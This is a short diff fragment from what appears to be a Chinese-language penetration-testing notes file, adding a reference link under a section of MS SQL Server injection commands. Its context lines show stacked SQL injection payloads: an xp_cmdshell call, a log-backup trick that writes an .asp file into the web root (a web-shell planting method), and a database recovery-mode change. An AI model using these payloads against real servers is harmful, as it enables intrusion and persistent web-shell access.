@@ -190,8 +190,7 @@ exec master.dbo.xp_cmdshell username;--
   ;backup log news to disk='c:\inetpub\wwwroot\yjh.asp'-- 
   ;alter database news RECOVERY simple
   ```
-
-- 
+[扩展参考](https://www.cnblogs.com/shanmao/archive/2012/11/15/2770878.html)
 
 > 端口转发
 >
